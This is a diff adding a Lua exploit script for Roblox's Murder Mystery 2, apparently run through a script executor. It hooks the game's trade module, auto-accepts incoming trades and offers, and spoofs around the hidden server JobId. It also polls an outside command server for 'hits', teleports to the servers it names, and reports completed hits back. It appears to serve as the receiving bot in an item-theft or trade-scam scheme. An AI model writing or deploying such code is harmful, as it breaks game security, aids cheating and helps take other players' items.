@@ -1,0 +1,762 @@
+-- discord.gg/syncrypt
+
+local function geniter(f, s, c)
+	if type(f) ~= "function" then
+		local mt = getmetatable(f)
+
+		if type(mt) == "table" and mt.__iter then
+			f, s, c = mt.__iter(f)
+		elseif type(f) == "table" then
+			f, s, c = next, f, nil
+		end
+	end
+
+	return function()
+		local r = table.pack(f(s, c))
+
+		if r[1] == nil then
+			return false
+		end
+
+		c = r[1]
+
+		return true, table.unpack(r, 1, r.n)
+	end
+end
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local ContentProvider = game:GetService("ContentProvider")
+if not getgenv().MM2_AJ_API_BASE then
+	getgenv().MM2_AJ_API_BASE = "https://elysium-mm2-api.snthnova.workers.dev"
+end
+
+local MM2_AJ_API_BASE = getgenv().MM2_AJ_API_BASE
+local v17 = MM2_AJ_API_BASE .. "/mm2-client2-status"
+local v18 = MM2_AJ_API_BASE .. "/complete-hit"
+local LocalPlayer = Players.LocalPlayer
+local Name = LocalPlayer.Name
+
+local function v21()
+	local ok, result = pcall(gethiddenproperty, game, "JobId")
+
+	if ok and type(result) == "string" then
+		if result ~= "" and result ~= "00000000-0000-0000-0000-000000000000" then
+			return result
+		end
+	end
+
+	local ok2, result2 = pcall(getproperties, game)
+
+	if ok2 and result2 and type(result2.JobId) == "string" and result2.JobId ~= "" then
+		return result2.JobId
+	end
+
+	return game.JobId
+end
+
+getgenv().JOBID = v21()
+print("[MM2 AJ] Waiting for JobID capture...")
+
+while not getgenv().JOBID do
+	task.wait()
+end
+
+local JOBID = getgenv().JOBID
+
+print("Real JobId: " .. getgenv().JOBID .. "\nFake JobId: " .. game.JobId)
+
+local t1 = {
+	"MouseButton1Click",
+	"MouseButton1Down",
+	"Activated"
+}
+
+local function v28(p1)
+	if not p1 then
+		return
+	end
+
+	for _, v in pairs(t1) do
+		local v31 = p1[v]
+
+		if v31 then
+			local v32, v33, v34 = pairs(getconnections(v31))
+			local v35 = geniter(v32, v33, v34)
+			local v36 = table.pack(v35())
+
+			if v36[1] then
+				local v37 = v36[3]
+
+				while true do
+					pcall(function()
+						v37.Function()
+					end)
+
+					local v38 = table.pack(v35())
+
+					if v38[1] then
+						v37 = v38[3]
+					else
+						break
+					end
+				end
+			end
+		end
+	end
+end
+
+task.spawn(function()
+	local t2 = {}
+
+	for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
+		if not descendant:IsA("RemoteFunction") then
+			if not descendant:IsA("RemoteEvent") then
+				continue
+			end
+		end
+
+		table.insert(t2, descendant)
+	end
+
+	pcall(ContentProvider.PreloadAsync, ContentProvider, t2)
+end)
+task.spawn(function()
+	repeat
+		task.wait(1)
+		pcall(function()
+			v28(LocalPlayer.PlayerGui.DeviceSelect.Container.Phone.Button)
+		end)
+		pcall(function()
+			v28(LocalPlayer.PlayerGui.Join.Friends.Play)
+		end)
+	until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
+end)
+
+local UpdateTrade
+local n1 = 0
+
+_G.LastOffer = nil
+
+local function v44()
+	local ok, result = pcall(function()
+		return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
+	end)
+
+	if not ok or not result then
+		return false
+	end
+
+	if type(result.UpdateTrade) ~= "function" then
+		return false
+	end
+
+	UpdateTrade = result.UpdateTrade
+	result.UpdateTrade = function(p2)
+		pcall(function()
+			if type(p2) == "table" and p2.LastOffer ~= nil then
+				_G.LastOffer = p2.LastOffer
+				n1 = p2.LastOffer
+				print("[MM2 AJ] UpdateTrade hook → LastOffer =", tostring(p2.LastOffer))
+			end
+		end)
+
+		return UpdateTrade(p2)
+	end
+
+	return true
+end
+
+v44()
+
+local function v47()
+	if _G.LastOffer ~= nil then
+		return _G.LastOffer
+	end
+
+	if n1 == nil then
+		return nil
+	end
+
+	return n1
+end
+
+local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
+
+if not Trade then
+	return
+end
+
+local u49 = false
+local u50 = false
+local u51 = false
+local SendRequest = Trade:FindFirstChild("SendRequest")
+
+if SendRequest then
+	SendRequest.OnClientInvoke = newcclosure(function()
+		pcall(function()
+			Trade.AcceptRequest:FireServer()
+		end)
+
+		return true
+	end)
+end
+
+local StartTrade = Trade:FindFirstChild("StartTrade")
+
+if StartTrade then
+	StartTrade.OnClientEvent:Connect(function()
+		u49 = true
+		u50 = false
+	end)
+end
+
+local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
+
+if DeclineTrade then
+	DeclineTrade.OnClientEvent:Connect(function()
+		u49 = false
+		u50 = true
+	end)
+end
+
+local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
+
+if AcceptTrade then
+	AcceptTrade.OnClientEvent:Connect(function(p3)
+		if p3 then
+			u49 = false
+			u50 = true
+			u51 = true
+		else
+			u51 = true
+		end
+	end)
+end
+
+local UpdateTrade2 = Trade:FindFirstChild("UpdateTrade")
+
+if UpdateTrade2 then
+	UpdateTrade2.OnClientEvent:Connect(function(p4)
+		if type(p4) ~= "table" then
+			return
+		end
+
+		if p4.LastOffer ~= nil then
+			_G.LastOffer = p4.LastOffer
+			n1 = p4.LastOffer
+			print("[MM2 AJ] Remote UpdateTrade → LastOffer =", tostring(p4.LastOffer))
+		end
+	end)
+end
+
+task.spawn(function()
+	while true do
+		task.wait(0.2)
+
+		if u49 then
+			local now = tick()
+			local v58
+			local n2 = 0
+
+			while tick() - now < 9 do
+				if not u49 then
+					if u50 then
+						break
+					end
+				end
+
+				local LastOffer = _G.LastOffer or n1
+
+				if LastOffer and LastOffer ~= 0 then
+					if LastOffer ~= v58 then
+						v58 = LastOffer
+						n2 = tick()
+					elseif tick() - n2 >= 0.8 then
+						break
+					end
+				end
+
+				task.wait(0.05)
+			end
+
+			if not u49 and u50 then
+				continue
+			end
+
+			local v61 = v47() or n1 or 0
+
+			u51 = false
+			u50 = false
+			pcall(function()
+				Trade.AcceptTrade:FireServer(game.PlaceId * 3, v61)
+				print("[MM2 AJ] AcceptTrade fired with: " .. tostring(v61))
+			end)
+
+			local now2 = tick()
+
+			while not u51 and not u50 and tick() - now2 < 10 do
+				task.wait(0.05)
+			end
+
+			if u51 then
+				print("[MM2 AJ] Accept registered ✓")
+			end
+		end
+	end
+end)
+task.spawn(function()
+	while true do
+		local response = Trade.GetTradeStatus:InvokeServer()
+
+		if response == "StartTrade" then
+			local n3 = 0
+
+			while true do
+				n3 += task.wait(0.1)
+
+				if n3 >= 7 then
+					Trade.DeclineTrade:FireServer()
+					print("[MM2 AJ] Auto-declined stale trade")
+
+					break
+				elseif Trade.GetTradeStatus:InvokeServer() ~= "StartTrade" then
+					break
+				end
+			end
+		elseif response == "ReceivingRequest" then
+			Trade.AcceptRequest:FireServer()
+			print("[MM2 AJ] Auto-accepted incoming request")
+		end
+
+		task.wait(0.1)
+	end
+end)
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "MM2AutoJoiner"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 99999
+pcall(function()
+	ScreenGui.Parent = CoreGui
+end)
+
+if not ScreenGui.Parent then
+	ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local Frame = Instance.new("Frame")
+
+Frame.Size = UDim2.new(0, 310, 0, 130)
+Frame.Position = UDim2.new(0, 10, 0, 10)
+Frame.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local function v67(p5, p6)
+	local UICorner = Instance.new("UICorner")
+
+	UICorner.CornerRadius = UDim.new(0, p6 or 8)
+	UICorner.Parent = p5
+end
+
+v67(Frame)
+
+local UIStroke = Instance.new("UIStroke")
+
+UIStroke.Color = Color3.fromRGB(220, 50, 50)
+UIStroke.Thickness = 1.5
+UIStroke.Parent = Frame
+
+local u70
+local u71
+local Position
+local Position2
+
+Frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		u70 = true
+		Position = input.Position
+		Position2 = Frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				u70 = false
+			end
+		end)
+	end
+end)
+Frame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		u71 = input
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if input == u71 and u70 then
+		local v74 = input.Position - Position
+
+		Frame.Position = UDim2.new(Position2.X.Scale, Position2.X.Offset + v74.X, Position2.Y.Scale, Position2.Y.Offset + v74.Y)
+	end
+end)
+
+local function createTextLabel(p7, p8, p9, p10, p11)
+	local TextLabel = Instance.new("TextLabel")
+
+	TextLabel.Size = UDim2.new(1, -10, 0, 18)
+	TextLabel.Position = UDim2.new(0, 8, 0, p8)
+	TextLabel.BackgroundTransparency = 1
+	TextLabel.Text = p7
+	TextLabel.TextColor3 = p10 or Color3.fromRGB(220, 220, 220)
+	TextLabel.Font = p11 and Enum.Font.GothamBold or Enum.Font.Gotham
+	TextLabel.TextSize = p9 or 12
+	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+	TextLabel.Parent = Frame
+
+	return TextLabel
+end
+
+createTextLabel("🔪 MM2 AUTO JOINER v3.1", 5, 13, Color3.fromRGB(255, 80, 80), true)
+createTextLabel("User: " .. Name, 23, 11, Color3.fromRGB(180, 180, 200))
+
+local v77 = createTextLabel("Status: Starting...", 41, 12)
+local v78 = createTextLabel("Action: —", 59, 12, Color3.fromRGB(150, 220, 255))
+local v79 = createTextLabel("⏱️ 0s", 77, 12, Color3.fromRGB(200, 200, 255))
+local now = tick()
+
+task.spawn(function()
+	while true do
+		task.wait(1)
+
+		local v81 = tick() - now
+		local v82 = math.floor(v81 % 60)
+		local v83 = math.floor(v81 / 60 % 60)
+		local v84 = math.floor(v81 / 3600 % 24)
+		local v85 = math.floor(v81 / 86400)
+		local v86 = string.format("%d days, %d hours, %d minutes, %d seconds", v85, v84, v83, v82)
+
+		if v85 == 0 then
+			v86 = string.format("%d hours, %d minutes, %d seconds", v84, v83, v82)
+		end
+
+		if v84 == 0 and v85 == 0 then
+			v86 = string.format("%d minutes, %d seconds", v83, v82)
+		end
+
+		if v83 == 0 and v84 == 0 and v85 == 0 then
+			v86 = string.format("%d seconds", v82)
+		end
+
+		v79.Text = "⏱️ " .. v86
+	end
+end)
+
+local function v87(p12, p13)
+	v77.Text = "Status: " .. p12
+	v77.TextColor3 = p13 or Color3.fromRGB(220, 220, 220)
+end
+local function v88(p14)
+	v78.Text = "Action: " .. p14
+end
+
+local request_ = syn and syn.request or http_request or request
+
+local function v90(p15)
+	if not request_ then
+		return nil
+	end
+
+	local ok, result = pcall(request_, {
+		Url = p15,
+		Method = "GET",
+		Headers = {
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+		}
+	})
+
+	if not ok or not result or not result.Body then
+		return nil
+	end
+
+	local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)
+
+	return ok2 and result2 or nil
+end
+local function v95(p16, p17)
+	if not request_ then
+		return nil
+	end
+
+	local ok, result = pcall(request_, {
+		Url = p16,
+		Method = "POST",
+		Headers = {
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside",
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode(p17)
+	})
+
+	if not ok or not result or not result.Body then
+		return nil
+	end
+
+	local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)
+
+	return ok2 and result2 or nil
+end
+local function v100(p18)
+	if not p18 or p18 == "" then
+		return false
+	end
+
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player.Name == p18 then
+			return true
+		end
+	end
+
+	return false
+end
+local function v103(p19, p20)
+	local v104 = tonumber(p19)
+
+	if not v104 then
+		return "failed"
+	end
+
+	pcall(function()
+		TeleportService:TeleportCancel()
+	end)
+	task.wait(0.2)
+
+	for i = 1, 20 do
+		local JobId = game.JobId
+		local ok, result = pcall(function()
+			TeleportService:TeleportToPlaceInstance(v104, p20, LocalPlayer)
+		end)
+
+		if not ok then
+			local v109 = tostring(result):lower()
+
+			if not v109:find("not available") and not v109:find("invalid") and not v109:find("does not exist") then
+				task.wait(1)
+
+				continue
+			end
+
+			return "unavailable"
+		end
+
+		task.wait(4)
+
+		if game.JobId ~= JobId then
+			if game.JobId == p20 then
+				return "success"
+			end
+		end
+
+		if game.JobId == JobId and i < 20 then
+			task.wait(1)
+		end
+	end
+
+	return "failed"
+end
+
+local u110
+local u111 = false
+
+local function v112()
+	u110 = nil
+	u111 = false
+	v88("idle")
+end
+local function v113(p21)
+	v87("✅ Completing hit...", Color3.fromRGB(80, 255, 120))
+	v95(v18, {
+		hit_id = p21,
+		username = Name,
+		game_type = "mm2"
+	})
+	v112()
+end
+
+task.spawn(function()
+	local VirtualUser = game:GetService("VirtualUser")
+
+	LocalPlayer.Idled:Connect(function()
+		VirtualUser:CaptureController()
+		VirtualUser:ClickButton2(Vector2.new())
+	end)
+	pcall(function()
+		VirtualUser:CaptureController()
+	end)
+
+	while true do
+		task.wait(60)
+		pcall(function()
+			VirtualUser:Button1Down(Vector2.new(0, 0), CFrame.new())
+			task.wait(0.1)
+			VirtualUser:Button1Up(Vector2.new(0, 0), CFrame.new())
+		end)
+	end
+end)
+task.spawn(function()
+	task.wait(2)
+	v87("🔍 Polling...", Color3.fromRGB(180, 180, 220))
+
+	while true do
+		task.wait(1)
+
+		local v115 = v90(v17 .. "?username=" .. HttpService:UrlEncode(Name) .. "&job_id=" .. HttpService:UrlEncode(JOBID))
+
+		if v115 then
+			local action = v115.action
+
+			if action ~= "idle" then
+				if action == "teleport" then
+					v112()
+
+					if v115.job_id ~= JOBID then
+						v87("🚀 Teleporting to " .. (v115.sender or "?") .. "...", Color3.fromRGB(80, 255, 120))
+						v88("teleport → " .. tostring(v115.job_id):sub(1, 18) .. "…")
+						print("[MM2 AJ] 🎯 HIT! From:", v115.sender, "| Job:", v115.job_id)
+
+						local v117 = v103(v115.place_id, v115.job_id)
+
+						if v117 ~= "unavailable" and v117 ~= "failed" then
+							print("[MM2 AJ] ✅ Teleport in progress — autoexec will resume in new server")
+
+							continue
+						end
+
+						v87("❌ Teleport " .. v117 .. " — skipping", Color3.fromRGB(255, 80, 80))
+						v113(v115.hit_id)
+
+						continue
+					end
+
+					v87("✅ Already in server", Color3.fromRGB(100, 255, 180))
+
+					continue
+				end
+
+				if action ~= "watch" then
+					continue
+				end
+
+				v88("watch")
+
+				local now2 = tick()
+				local v119, v120, sender
+
+				if not u110 then
+					u110 = now2
+
+					local v122 = v87
+					local sender2 = v115.sender
+
+					if sender2 then
+						v122("👀 Watching for " .. sender2, Color3.fromRGB(255, 200, 80))
+						print("[MM2 AJ] 👁️ Watch mode — sender:", v115.sender)
+						v119 = now2 - u110
+
+						if v100(v115.sender) then
+							u111 = true
+							v120 = v87
+							sender = v115.sender
+
+							if sender then
+								v120("👀 " .. sender .. " is trading...", Color3.fromRGB(100, 255, 180))
+
+								if not u110 or not (v119 >= 90) then
+									continue
+								end
+
+								v87("⏰ Watch timeout — giving up", Color3.fromRGB(255, 100, 50))
+								v113(v115.hit_id)
+
+								continue
+							end
+
+							sender = "?"
+							v120("👀 " .. sender .. " is trading...", Color3.fromRGB(100, 255, 180))
+						elseif u111 then
+							v87("✅ Sender left — hit complete!", Color3.fromRGB(80, 255, 120))
+							v113(v115.hit_id)
+						else
+							v87("❌ Sender never arrived — failing hit", Color3.fromRGB(255, 80, 80))
+							v113(v115.hit_id)
+						end
+
+						if not u110 or not (v119 >= 90) then
+							continue
+						end
+
+						v87("⏰ Watch timeout — giving up", Color3.fromRGB(255, 100, 50))
+						v113(v115.hit_id)
+
+						continue
+					end
+
+					v122("👀 Watching for ?", Color3.fromRGB(255, 200, 80))
+					print("[MM2 AJ] 👁️ Watch mode — sender:", v115.sender)
+				end
+
+				v119 = now2 - u110
+
+				if v100(v115.sender) then
+					u111 = true
+					v120 = v87
+					sender = v115.sender
+
+					if sender then
+						v120("👀 " .. sender .. " is trading...", Color3.fromRGB(100, 255, 180))
+
+						if not u110 or not (v119 >= 90) then
+							continue
+						end
+
+						v87("⏰ Watch timeout — giving up", Color3.fromRGB(255, 100, 50))
+						v113(v115.hit_id)
+
+						continue
+					end
+
+					sender = "?"
+					v120("👀 " .. sender .. " is trading...", Color3.fromRGB(100, 255, 180))
+				elseif u111 then
+					v87("✅ Sender left — hit complete!", Color3.fromRGB(80, 255, 120))
+					v113(v115.hit_id)
+				else
+					v87("❌ Sender never arrived — failing hit", Color3.fromRGB(255, 80, 80))
+					v113(v115.hit_id)
+				end
+
+				if not u110 or not (v119 >= 90) then
+					continue
+				end
+
+				v87("⏰ Watch timeout — giving up", Color3.fromRGB(255, 100, 50))
+				v113(v115.hit_id)
+
+				continue
+			end
+
+			v87("🔍 Polling...", Color3.fromRGB(180, 180, 220))
+			v112()
+		else
+			v87("⚠️ No response", Color3.fromRGB(255, 100, 100))
+		end
+	end
+end)
+print("[MM2 AJ] 🔪 MM2 Auto Joiner v3.1 — Vercel-brained, stateless")
+print("[MM2 AJ] 🖱️  GUI is draggable")
